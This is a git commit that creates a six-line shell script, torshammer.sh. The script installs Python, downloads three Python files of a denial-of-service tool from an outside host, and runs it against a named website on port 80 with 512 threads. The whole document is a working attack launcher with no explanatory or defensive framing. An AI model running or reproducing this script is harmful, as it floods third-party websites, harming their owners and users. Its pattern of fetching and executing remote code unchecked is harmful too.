a1ecbc6cdbf1a9adc95b2829bf50415fdf1e9cbb
delan-group <77882003+delan-group@users.noreply.github.com>
2021-02-02 12:19:36 +0800

    Create torshammer.sh

---
+++ torshammer.sh
@@ -0,0 +1,6 @@
+apt-get install python
+wget dl.mcru.xyz/torshammer.py
+wget dl.mcru.xyz/socks.py
+wget dl.mcru.xyz/terminal.py
+yum install python
+python torshammer.py -t www.httydfandom.top -p 80 -r 512
